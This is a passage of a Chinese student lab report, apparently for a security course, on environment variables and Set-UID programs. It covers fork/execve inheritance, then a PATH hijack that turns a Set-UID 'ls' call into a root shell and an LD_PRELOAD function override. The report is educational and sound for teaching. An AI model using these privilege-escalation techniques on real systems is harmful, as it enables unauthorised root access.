src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698217242471-db1899bb-ba90-4109-9edb-5b4552790e67.png#averageHue=%23282624&clientId=u364b3a35-d487-4&from=paste&height=88&id=ue698f1de&originHeight=139&originWidth=560&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22774&status=done&style=none&taskId=u815b695b-3863-464e-b740-118e8dae068&title=&width=355.55557170242304" alt="image.png"></p><p>再运行unset Myname进行清除，此时查看环境变量，已经找不到了名为 Myname 的环境变量<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698217310032-e4991f86-1df7-42e2-a544-ffef7389cd20.png#averageHue=%232a2827&clientId=u364b3a35-d487-4&from=paste&height=86&id=u0c6838d3&originHeight=136&originWidth=487&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22648&status=done&style=none&taskId=ueefcb1ec-c5fd-4f10-97d7-79cc2477f35&title=&width=309.20636324835715" alt="image.png"><br /><strong>原因分析：</strong> export 和 unset 都是shell自身的命令，操作的是shell变量，而使用export命令设置的shell变量会被shell传递到子进程中, 所以shell fork得到的子进程env 能看到export命令设置的环境变量，而unset清除之后就不会再传递过去，所以就看不到了。</p><p><a name="AZ20Y"></a></p><h2 id="2-2-Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process"><a href="#2-2-Task-2-Passing-Environment-Variables-from-Parent-Process-to-Child-Process" class="headerlink" title="2.2 Task 2: Passing Environment Variables from Parent Process to Child Process"></a><strong>2.2 Task 2: Passing Environment Variables from Parent Process to Child Process</strong></h2><p><strong>在进行实验之前,我们首先学习一下fork函数用法:</strong></p><blockquote><p>使用man fork命令,我们发现fork函数创建一个父进程的副本,即子进程,除了一些进程ID,memory lock等不同外,其余均相同,当然也包括父进程的环境变量值,全部复制给子进程.</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698217542442-fbb7b8c8-ecc5-4a21-92ba-ef1981bbf44d.png#averageHue=%23262524&clientId=u364b3a35-d487-4&from=paste&height=352&id=u445b5268&originHeight=554&originWidth=847&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=48902&status=done&style=none&taskId=u4c82b2ab-816f-42f7-93a8-d17a5031134&title=&width=537.7778021999148" alt="image.png"></p><blockquote><p>即:经过fork()以后，父进程和子进程拥有相同内容的代码段、数据段和用户堆栈，就像父进程把自己克隆了一遍。事实上，父进程只复制了自己的PCB块。而代码段，数据段和用户堆栈内存空间并没有复制一份，而是与子进程共享。只有当子进程在运行中出现写操作时，才会产生中断，并为子进程分配内存空间。</p></blockquote><p><strong>观察函数返回值信息:</strong><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698218075573-d751e6b1-3184-4939-a026-502e707f759c.png#averageHue=%23282726&clientId=u364b3a35-d487-4&from=paste&height=98&id=u2ecd2062&originHeight=155&originWidth=833&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=14503&status=done&style=none&taskId=u37c0a023-ec2c-4b0b-91a9-1a9b170f169&title=&width=528.8889129073542" alt="image.png"></p><blockquote><p>即fork函数运行后,程序会出现两个进程,一个父进程(本身),一个子进程,如果成功父进程返回子进程的ID,子进程返回0,如果失败(可能原因有很多,比如:系统进程数过多,违背操作系统相关策略等),父进程返回-1,没有子进程产生,则产生相应的错误码</p></blockquote><p><a name="acrIc"></a></p><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>运行myprintenv.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprintenv myprintenv.c</span><br><span class="line">./myprintenv</span><br></pre></td></tr></table></figure><p>结果如下(所占篇幅太大，省略一部分)：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698218972057-d7e10bf6-1bed-4f5d-9638-b8c41310e12a.png#averageHue=%23262524&clientId=u364b3a35-d487-4&from=paste&height=244&id=u2b05bb51&originHeight=385&originWidth=1029&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=54887&status=done&style=none&taskId=u2375a517-8fc2-4f9f-8116-22a94027e91&title=&width=653.3333630032023" alt="image.png"><br />将myprintenv保存到file1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ myprintenv &gt; file1</span><br></pre></td></tr></table></figure><p><a name="bwSpu"></a></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>把子进程打印环境变量的代码注释掉，父进程的注释去掉</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> childPid;</span><br><span class="line">    <span class="keyword">switch</span>(childPid = fork()) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:  <span class="comment">/* child process */</span></span><br><span class="line">            <span class="comment">//printenv();          </span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">default</span>:  <span class="comment">/* parent process */</span></span><br><span class="line">            printenv();       </span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新编译运行myprintenv.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myprintenv myprintenv.c</span><br><span class="line">./myprintenv</span><br></pre></td></tr></table></figure><p>将myprintenv这次打印的内容保存到file2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ myprintenv &gt; file2</span><br></pre></td></tr></table></figure><p><a name="wX913"></a></p><h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>比较二者的不同，使用的是diff命令比较两个输出文件的不同。可以看到，子进程继承了父进程的全部环境变量<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698223264142-354b855d-cb39-4a6b-94b1-23d1a804d74f.png#averageHue=%23272625&clientId=u364b3a35-d487-4&from=paste&height=38&id=u1cfcfcc3&originHeight=57&originWidth=720&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=13746&status=done&style=none&taskId=u278e58ad-9325-4827-a75b-5278848ef40&title=&width=476.1329650878906" alt="image.png"><br><a name="ZKJIr"></a></p><h2 id="2-3-Task-3-Environment-Variables-and-execve"><a href="#2-3-Task-3-Environment-Variables-and-execve" class="headerlink" title="**2.3 Task 3: Environment Variables and **execve()"></a>**2.3 Task 3: Environment Variables and **execve()</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[],<span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><p>进程通过execve函数，同样可以执行新的程序，但不会创建子进程来运行，此时进程的text,data,bss等内存数据将会被新程序的数据覆盖，进程中存储的环境变量将会丢失，所以需要显式地利用上面函数第三个参数传递给新运行的程序(注意,不是子进程)，第一个参数指向要运行的新程序的路径，第二个参数为一个数组,包含新进程的所有参数，一般情况下，第一个参数就是第二个参数数组argv[0]的值。<br><a name="d0uB4"></a></p><h3 id="step1-1"><a href="#step1-1" class="headerlink" title="step1"></a>step1</h3><p>运行所给程序myenv.c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o myenv myenv.c</span><br><span class="line">./myenv</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698223713894-886cccb6-b902-43bb-a140-61a3c40e8cae.png#averageHue=%23272625&clientId=u364b3a35-d487-4&from=paste&height=50&id=u17f6208a&originHeight=79&originWidth=752&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22144&status=done&style=none&taskId=uc41aef5f-e77b-4d4c-98f2-1dd96a7a9de&title=&width=477.46033914325375" alt="image.png"><br><a name="i5EOH"></a></p><h3 id="step2-1"><a href="#step2-1" class="headerlink" title="step2"></a>step2</h3><p>可以发现没有打印出任何东西，因为最后给execve传的参数是NULL。我们把NULL改为environ，重新编译运行：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698224533671-31009b97-cb1c-4dd4-8205-ee1abe8f01f2.png#averageHue=%23272625&clientId=u364b3a35-d487-4&from=paste&height=255&id=ud1c2ca74&originHeight=402&originWidth=871&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=61090&status=done&style=none&taskId=uea168a55-7517-4e36-8a55-b2f8d10e4ac&title=&width=553.0158981300186" alt="image.png"><br />代码中的&#x2F;usr&#x2F;bin&#x2F;env为一个程序路径,功能为打印当前进程的环境变量。execve函数运行了这个程序,新程序是否有环境变量取决于是否传递了环境变量参数。所以，fork与execve在传递环境变量功能方面都可以达到相同效果,但是实现机理不同。<br><a name="Kw1Ho"></a></p><h3 id="step3-1"><a href="#step3-1" class="headerlink" title="step3"></a>step3</h3><p>此时可以得出结论，第一次实验中，发现没有打印出环境变量，这是因为在执行execve()函数时，传递了一个NULL的参数，自然不会有什么打印结果。当在execve()函数中，传递了全局环境变量environ时候，可以成功将传递进去的环境变量打印出来。<br><a name="FELsA"></a></p><h2 id="2-4-Task-4-Environment-Variables-and-system"><a href="#2-4-Task-4-Environment-Variables-and-system" class="headerlink" title="**2.4 Task 4: Environment Variables and **system()"></a>**2.4 Task 4: Environment Variables and **system()</h2><p>system函数解析<br />功能:与execve一样,进行运行一段命令,仅有一个参数,和execve不同的是,system可以运行多个命令<br />system通过调用&#x2F;bin&#x2F;sh -c command 命令来执行command,也就是说,借助了外部程序shell来执行命令,shell程序首先被执行,然后shell将command作为输入并解析它,然后执行输入的任何命令,也可以多条,只需要加上一个符号.</p><p>我们发现,system实际上首先运行fork，产生一个子进程,然后使用execl函数进行运行命令&#x2F;bin&#x2F;sh,产生一个shell程序，运行command命令，同时，将环境变量显式传递给新程序，同时在父进程中调用wait去等待子进程结束。环境变量经过了三个阶段:</p><ol><li>进程本身拥有</li><li>fork时复制给子进程</li><li>execl函数运行时,显式赋值给新程序</li></ol><p><strong>运行如下代码:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/usr/bin/env&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698236128933-5c6fff1d-7624-4688-804a-17732bb90020.png#averageHue=%23262423&clientId=u364b3a35-d487-4&from=paste&height=220&id=ua071c479&originHeight=347&originWidth=873&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=51437&status=done&style=none&taskId=ua40d7fd9-4a9e-46ef-b404-209ec5457a1&title=&width=554.2857394575274" alt="image.png"><br />可以打印出所有环境变量,说明system函数会将环境变量传递给新程序。</p><p><a name="eihmw"></a></p><h2 id="2-5-Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#2-5-Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="2.5 Task 5: Environment Variable and Set-UID Programs"></a><strong>2.5 Task 5: Environment Variable and <strong>Set-UID</strong> Programs</strong></h2><p><a name="ZK2nS"></a></p><h3 id="step1-2"><a href="#step1-2" class="headerlink" title="step1"></a><strong>step1</strong></h3><p><strong>Set-UID程序：</strong><br>:::info<br>当一个程序需要以root权限运行，而此时又不想将root权限赋予用户，此时可以设置为一个Set-UID程序，在程序中运行指定的需要root权限的程序，注意:Set-UID程序是指使文件对任何可以执行此文件的用户执行时，以文件所有者的权限执行。也就是说，如果需要以root权限运行Set-UID程序时，还需要将程序文件所有者设置为root.同时也要保证用户具有运行这个文件的权限.<br>:::<br>实验所给示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (environ[i] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, environ[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698236600026-7839463a-f98f-4892-ad40-ecfd3e1553ed.png#averageHue=%23262524&clientId=u364b3a35-d487-4&from=paste&height=241&id=ub478159b&originHeight=380&originWidth=874&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=56522&status=done&style=none&taskId=u831c6c19-2de2-4279-b302-45ddf49e11d&title=&width=554.9206601212817" alt="image.png"><br><a name="ydMVA"></a></p><h3 id="step2-2"><a href="#step2-2" class="headerlink" title="step2"></a>step2</h3><p>编译该程序，在执行step2中指令之前，先查看一下当前文件的用户以及模式。(我把前面的代码注释了，用的还是的myenv.c)如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chown root myenv <span class="comment">//root模式</span></span><br><span class="line">$ sudo chmod <span class="number">4755</span> myenv <span class="comment">//set-uid的设置</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698237163782-e1129426-be00-4fdb-9a21-07ac7ec56dee.png#averageHue=%232c2726&clientId=u364b3a35-d487-4&from=paste&height=105&id=u6fec4ec2&originHeight=166&originWidth=778&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41296&status=done&style=none&taskId=u97486069-2442-4dea-ae03-9626922331d&title=&width=493.9682764008663" alt="image.png"><br><a name="RhPyT"></a></p><h3 id="step3-2"><a href="#step3-2" class="headerlink" title="step3"></a>step3</h3><p>按照要求对环境变量进行修改：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698238601041-3329e6a4-29f4-447b-bd3a-fcb31f4e3c21.png#averageHue=%23272625&clientId=u364b3a35-d487-4&from=paste&height=91&id=ud65397ea&originHeight=143&originWidth=1264&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=41827&status=done&style=none&taskId=ud6081479-4901-487d-833f-d61a41a09f4&title=&width=802.5397189854691" alt="image.png"><br />可以看到没有LD_LIBRARY_PATH环境变量：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698238664051-88f6a012-2077-41d0-ae2f-e64b8615cf02.png#averageHue=%23272423&clientId=u364b3a35-d487-4&from=paste&height=37&id=u7d7d0fcb&originHeight=58&originWidth=761&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=11703&status=done&style=none&taskId=u427f739c-b2e7-4f22-87fc-6695874fa77&title=&width=483.1746251170427" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698238573692-22c65866-eb85-474a-a49c-d2d461c5e284.png#averageHue=%23312e2c&clientId=u364b3a35-d487-4&from=paste&height=68&id=u792c23a6&originHeight=107&originWidth=1197&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=24707&status=done&style=none&taskId=uce566e87-c4a0-42ac-8051-c860fe664b1&title=&width=760.0000345139292" alt="image.png"><br />对LD_LIBRARY_PATH的环境变量单独过滤。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698238776399-2d89045e-dc05-43c1-b58b-c0cd7e827a66.png#averageHue=%232a2827&clientId=u364b3a35-d487-4&from=paste&height=32&id=u60c44ed9&originHeight=51&originWidth=864&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=16461&status=done&style=none&taskId=u83dfbf92-afbc-4658-8a0b-d3ba772c4e6&title=&width=548.5714534837384" alt="image.png"><br />可以看到，依然是没有成功显示出来，对此，不是没有成功export的原因，后续查阅资料后得知：</p><blockquote><p><a name="WFtvA"></a></p></blockquote><h4 id="为什么叫子进程："><a href="#为什么叫子进程：" class="headerlink" title="为什么叫子进程："></a>为什么叫子进程：</h4><blockquote><p>shell中执行程序,当输入程序名称时,shell会生成一个子进程并在子进程中执行该程序。这个过程通常为先使用fork函数创建一个子进程,再使用execve()函数(或者其变种之一)来完成。</p></blockquote><blockquote><p><a name="JEU2H"></a></p></blockquote><h4 id="为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中："><a href="#为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中：" class="headerlink" title="为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中："></a>为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中：</h4><blockquote><p>这是因为动态链接器的保护机制，设置LD_LIBRARY_PATH环境变量其实就是设置动态库的查找路径，而这是不会出现在子进程的环境变量中的，这样一来子进程是看不到的。根据动态链接库的防御机制，在编译后设置了该程序的有效ID为root，而在普通用户shell中运行时，真实用户为seed，因此此处设置的环境变量被忽略，没有起作用。</p></blockquote><p><a name="ACxSD"></a></p><h2 id="2-6-Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#2-6-Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="**2.6 Task 6: The PATH Environment Variable and **Set-UID Programs"></a>**2.6 Task 6: The PATH Environment Variable and **Set-UID <strong>Programs</strong></h2><p>运行代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接执行，效果与ls命令相同<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698239425505-693e64ae-c66d-42df-b744-6f9331868928.png#averageHue=%232a2827&clientId=u364b3a35-d487-4&from=paste&height=67&id=ue273aad8&originHeight=106&originWidth=785&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=22590&status=done&style=none&taskId=ucc02098e-114b-4691-8dba-257ab53a9d4&title=&width=498.41272104714653" alt="image.png"><br />Ubuntu20.04（以及之前的几个版本）中，&#x2F;bin&#x2F;sh实际上是一个指向&#x2F;bin&#x2F;dash的符号链接。这个shell程序有一个对策，可以防止自己在Set-UID进程中被执行。基本上，如果dash检测到它是在Set-UID进程中执行的，它会立即将有效用户ID更改为进程的真实用户ID，本质上放弃了特权。由于我们的受害者程序是一个Set-UID程序，因此在&#x2F;bin&#x2F;dash中的对策可以防止我们的攻击。为了了解我们的攻击在没有这种对策的情况下如何工作，我们将把&#x2F;bin&#x2F;sh链接到另一个没有这种对策的壳体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure><p>将task6设置为root用户下的Set_UID程序<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698239816058-56773b5d-62c8-417e-9cc7-408d14cf94f4.png#averageHue=%232d2b29&clientId=u364b3a35-d487-4&from=paste&height=32&id=u0d57da3b&originHeight=51&originWidth=757&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=17385&status=done&style=none&taskId=uecb77ff5-a5e6-4ed9-b03f-04a300aab44&title=&width=480.6349424620254" alt="image.png"><br />将&#x2F;bin&#x2F;sh程序复制到&#x2F;tmp目录中,重命名为ls，按照示例改了PATH，发现运行task6没有变化。将&#x2F;tmp放置到PATH开头,首先被搜索<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698287735619-b924b48e-0a15-417a-834d-be15bd2004e6.png#averageHue=%23292826&clientId=u4a51d072-f65a-4&from=paste&height=107&id=u2ef0b106&originHeight=169&originWidth=853&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=39795&status=done&style=none&taskId=u02fdd70b-4549-4812-993a-db545ffb400&title=&width=541.5873261824407" alt="image.png"><br />过滤一下环境变量，可以看到PATH已经被改变了，再运行task6发现：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698287758270-6739e998-73b0-4553-9172-c3b441b690d7.png#averageHue=%232a2827&clientId=u4a51d072-f65a-4&from=paste&height=171&id=u7aa8d9d5&originHeight=269&originWidth=910&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=46522&status=done&style=none&taskId=ucd522400-beb1-42b7-948d-54b4d0002a0&title=&width=577.7778040164374" alt="image.png"><br />虽然程序中命令为ls,但实际上运行了我们自己设定的程序&#x2F;bin&#x2F;sh,同时由于程序为Set-UID,有效用户为root,所以task6运行时以root权限运行,得到root权限的shell.</p><blockquote><p><strong>注意:</strong><br>在实验中,我们将ls 命令执行的PATH进行了修改，所有后续我们ls命令将会不可用,但是,由于export命令设置的环境变量仅适用于此shell,所以我们可以关闭shell,再重新打开,PATH就会恢复默认值了.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698288675335-8b52be2e-a0a2-4339-b9f4-5d697630a8f2.png#averageHue=%232d2b29&clientId=u4a51d072-f65a-4&from=paste&height=69&id=u6e62b1d2&originHeight=109&originWidth=1175&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=28113&status=done&style=none&taskId=u616f9a1b-479f-4866-af2d-c831fd2fa56&title=&width=746.0317799113341" alt="image.png"></p></blockquote><p><a name="eVzWR"></a></p><h2 id="2-7-Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#2-7-Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="**2.7 Task 7: The **LD PRELOAD **Environment Variable and **Set-UID Programs"></a>**2.7 Task 7: The **LD PRELOAD **Environment Variable and **Set-UID <strong>Programs</strong></h2><p><a name="UjvOk"></a></p><h3 id="step1-3"><a href="#step1-3" class="headerlink" title="step1"></a><strong>step1</strong></h3><p>将示例所给代码命名为mylib.c，试图运行，但其没有main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sleep</span> <span class="params">(<span class="type">int</span> s)</span>  </span><br><span class="line">&#123;  </span><br><span class="line"><span class="comment">/* If this is invoked by a privileged program, </span></span><br><span class="line"><span class="comment">you can do damages here! */</span>  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I am not sleeping!\n&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据示例，用以下方式编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fPIC -g -c mylib.c </span><br><span class="line">$ gcc -shared -o libmylib.so<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span> mylib.o -lc</span><br></pre></td></tr></table></figure><p>再设置LD_PRELOAD的环境变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export LD_PRELOAD=./libmylib.so<span class="number">.1</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>最后，编译以下程序myprog，并在与上述动态链接库libmylib.so.1.0.1相同的目录中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* myprog.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698305289540-b3f837c8-db77-408e-81f1-fd4ae2cf21e3.png#averageHue=%23252423&clientId=u4a51d072-f65a-4&from=paste&height=139&id=JBPFQ&originHeight=219&originWidth=866&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=35580&status=done&style=none&taskId=u6a29c915-8597-447a-a754-d158c3deab4&title=&width=549.841294811247" alt="image.png"><br><a name="ae7uU"></a></p><h3 id="step2-3"><a href="#step2-3" class="headerlink" title="step2"></a><strong>step2</strong></h3><p>• myprog 现在是普通程序，用普通用户运行 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698317560778-07822de0-fd60-4ddd-af76-95598afc6277.png#averageHue=%23292726&clientId=u63053703-97c6-4&from=paste&height=77&id=ER5JQ&originHeight=121&originWidth=666&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=27935&status=done&style=none&taskId=ua482c37a-8117-4c2d-b830-29dcff10682&title=&width=422.85716206038165" alt="image.png"><br />• 设置 myprog 为 root用户， set-uid程序，普通用户运行<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698318920965-8f63f845-92ec-4398-90ed-04fa2738fb33.png#averageHue=%232c2827&clientId=ufa024f7f-a9c4-4&from=paste&height=102&id=u302152da&originHeight=161&originWidth=768&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=46338&status=done&style=none&taskId=u5b5366f4-e1e5-4236-8e29-2304cfa0dc5&title=&width=487.619069763323" alt="image.png"><br />• 设置 myprog 为 root用户， set-uid程序，使用 root 用户设置 LD_PRELOAD 环境变量，使用 root 用户运行myprog。<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698323363310-f5797ca1-cfbd-4554-8d04-8b4d07137952.png#averageHue=%23282624&clientId=ucd9308f2-d8d8-4&from=paste&height=190&id=uc8178a02&originHeight=299&originWidth=1009&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=66837&status=done&style=none&taskId=u9b188ac3-4f64-48ea-9a8a-28d4c78b389&title=&width=640.6349497281158" alt="image.png"><br />• 将 myprog 改成 set-uid user1程序，并在 user2 账号里设置 LD_PRELOAD 环境变量并运行。这里我新创建了账户meow，user1&#x3D;meow, user2&#x3D;seed。结果如下<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1698324091577-ed8a8dda-2004-4ecc-a48c-13abaf934cc8.png#averageHue=%232d2b29&clientId=u23fef80c-c7f1-4&from=paste&height=157&id=u3661b032&originHeight=247&originWidth=937&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=59593&status=done&style=none&taskId=u2c9e1854-7745-4b0b-8856-b75d8d3ab94&title=&width=594.9206619378042" alt="image.png"></p><p><a name="XQYtE"></a></p><h3 id="step3-3"><a href="#step3-3" class="headerlink" title="step3"></a><strong>step3</strong></h3><p>原因分析：这个关键在于 LD_PRELOAD 环境变量有没有被动态连接器屏蔽，LD_PRELOAD 和 LD_LIBRARY_PATH 类似，具体机制可以查看上面 Task 5 及其分析。</p><p>对于第一种情况，effective uid 等于 real uid，均为 seed，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p><p>对于第二种情况，effective uid为root，real uid为seed，不相同，LD_PRELOAD 